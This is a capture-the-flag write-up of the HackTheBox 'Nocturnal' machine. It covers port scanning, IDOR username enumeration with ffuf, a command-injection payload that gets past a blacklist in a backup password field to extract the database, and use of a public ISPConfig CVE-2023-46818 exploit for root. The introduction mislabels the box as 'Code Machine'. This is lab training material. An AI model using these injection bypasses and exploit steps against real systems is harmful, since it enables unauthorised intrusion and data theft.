- *machine* : https://app.hackthebox.com/machines/Nocturnal
- *Difficulty:* Easy

## **Introduction :**
This article explains in detail the process of exploiting Code Machine on HackTheBox. By enumerating services on ports 80 and 22, we find a webpage for upload the files typr pdf, doc, docx, xls, xlsx, odt. which is vulnerable to **Insecure Direct Object References (IDOR)** in the **view.ph**. 
## **Enumeration :**
### nmap `scan`:

```bash
└─# nmap -sS -sC -sV 10.10.11.64
Starting Nmap 7.95 ( https://nmap.org ) at 2025-04-17 07:14 EDT
Nmap scan report for nocturnal.htb (10.10.11.64)
Host is up (1.4s latency).
Not shown: 998 closed tcp ports (reset)
PORT   STATE SERVICE VERSION
22/tcp open  ssh     OpenSSH 8.2p1 Ubuntu 4ubuntu0.12 (Ubuntu Linux; protocol 2.0)
| ssh-hostkey: 
|   3072 20:26:88:70:08:51:ee:de:3a:a6:20:41:87:96:25:17 (RSA)
|   256 4f:80:05:33:a6:d4:22:64:e9:ed:14:e3:12:bc:96:f1 (ECDSA)
|_  256 d9:88:1f:68:43:8e:d4:2a:52:fc:f0:66:d4:b9:ee:6b (ED25519)
80/tcp open  http    nginx 1.18.0 (Ubuntu)
|_http-server-header: nginx/1.18.0 (Ubuntu)
|_http-title: Welcome to Nocturnal
| http-cookie-flags: 
|   /: 
|     PHPSESSID: 
|_      httponly flag not set
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel
```

there are two ports open : 
- 22 - SSH
- 80 - HTTP

## **Initial foothold :**
### web on port 80:

![](https://github.com/Mgh-Zakariae/hackthebox-writeups/blob/77e62cfb8aca84ecf149616b454b08d2f16f74ce/images/9.png)

- checking http://nocturnal.htb , after register and login we found a page for upload file that we can back to install it. We can only upload files type pdf, doc, docx, xls, xlsx, odt , also the server delete the characters `\, /` , it delete any character before `/` or `\` in the file name.
- By changing the value of the `username` parameter in http://nocturnal.htb/view.php?username=ghost&file=file.pdf, we can test if the system performs proper authorization checks for each user. In a secure system, the application should only allow users to access files associated with their own username or role, but in this case, we found that manipulating the `username` parameter allowed access to other users' files, even if we were not authenticated as them. Furthermore, altering the `file` parameter allowed us to view files beyond the intended scope, thus confirming the presence of an IDOR vulnerability.
- we can test this by register another account and access to it with another account by this URL.
- so , to discover a hidden usernames , we can use `ffuf` tool 

```bash
└─# ffuf -u 'http://nocturnal.htb/view.php?username=FUZZ&file=file.pdf' -w /usr/share/wordlists/seclists/Usernames/Names/names.txt -fs 2985 -H 'Cookie: PHPSESSID=3k2cutnbs1p28j9g3cefqp20k4'

        /'___\  /'___\           /'___\       
       /\ \__/ /\ \__/  __  __  /\ \__/       
       \ \ ,__\\ \ ,__\/\ \/\ \ \ \ ,__\      
        \ \ \_/ \ \ \_/\ \ \_\ \ \ \ \_/      
         \ \_\   \ \_\  \ \____/  \ \_\       
          \/_/    \/_/   \/___/    \/_/       

       v2.1.0-dev
________________________________________________

....
________________________________________________

admin                   [Status: 200, Size: 3037, Words: 1174, Lines: 129, Duration: 1875ms]
amanda                  [Status: 200, Size: 3113, Words: 1175, Lines: 129, Duration: 420ms]

```

- by checking username `amanda` , we will found a `privacy.odt` file and it's a zip archive.

```bash
└─# file privacy.odt 
privacy.odt: Zip archive, with extra data prepended
```

```bash
└─# unzip privacy.odt -d ./fileOdt
```

- to speed up the process , we can use command `grep -ri 'passw' ./fileOdt` to search for a password. We found the password of `amanda` then login with it. We found something new interesting.

![](https://github.com/Mgh-Zakariae/hackthebox-writeups/blob/77e62cfb8aca84ecf149616b454b08d2f16f74ce/images/10.png)

- By checking admin panel , we found a php files that structure a web application. also there is a part to create a backup and install it. 

![](https://github.com/Mgh-Zakariae/hackthebox-writeups/blob/77e62cfb8aca84ecf149616b454b08d2f16f74ce/images/11.png)

![](https://github.com/Mgh-Zakariae/hackthebox-writeups/blob/77e62cfb8aca84ecf149616b454b08d2f16f74ce/images/12.png)

- in admin.php , we found a code of create Backup that have a blacklist for backup password `[';', '&', '|', '$', ' ', '`', '{', '}', '&&']`, also we can found a path to database in login.php.
- the process of the exploitation is inject a malicious command in password input but without using the characters from blacklist to add  a database file to backup.
- after analyzing serval inputs and its errors ,we found a correct input `password	backups/backup_2025-04-16.zip	../nocturnal_database	#` (we have a tab key not space) 
- after install database file we unzip it and open the file by `sqlite3` command , then we can find the table of user that contain 3 important users (tabias, admin, amanda) we tried decrypt its password hash and we found plaintext password for tobias, we can use it to login via SSH.

![](https://github.com/Mgh-Zakariae/hackthebox-writeups/blob/77e62cfb8aca84ecf149616b454b08d2f16f74ce/images/13.png)

> after login, you can print user.txt to get user flag.

## **Privilege escalation :**

- tobias user does not have `sudo` privilege, but By checking internal process we found a open port in local network (127.0.0.1:8080)

```bash
tobias@nocturnal:~$ netstat -lnp
(Not all processes could be identified, non-owned process info
 will not be shown, you would have to be root to see it all.)
Active Internet connections (only servers)
Proto Recv-Q Send-Q Local Address           Foreign Address         State       PID/Program name    
tcp        0      0 127.0.0.1:33060         0.0.0.0:*               LISTEN      -                   
tcp        0      0 127.0.0.1:3306          0.0.0.0:*               LISTEN      -                   
tcp        0      0 127.0.0.1:8080          0.0.0.0:*               LISTEN      -  
```

- we can use command `ssh tobias@10.10.11.64 -L 5555:127.0.0.1:8080` to send traffic from our machine in 127.0.0.1:555 to port 8080 in target machine. so by checking http://127.0.0.1:5555 , we found a ISPconfig web page. 
- its version is 3.2 that is has a CVE-2023-46818 vulnerability. 

![](https://github.com/Mgh-Zakariae/hackthebox-writeups/blob/77e62cfb8aca84ecf149616b454b08d2f16f74ce/images/14.png)

- by googling we can find a exploitation, and by use it we can gain root privilege. 

```bash
└─# python3 exploit.py http://127.0.0.1:5555 admin PASSWORD 
```

![](https://github.com/Mgh-Zakariae/hackthebox-writeups/blob/77e62cfb8aca84ecf149616b454b08d2f16f74ce/images/15.png)


#### 💥💻 LET'S GOOOOOOO — **Nocturnal MACHINE IS PAWNED!** 🏴‍☠️🔥

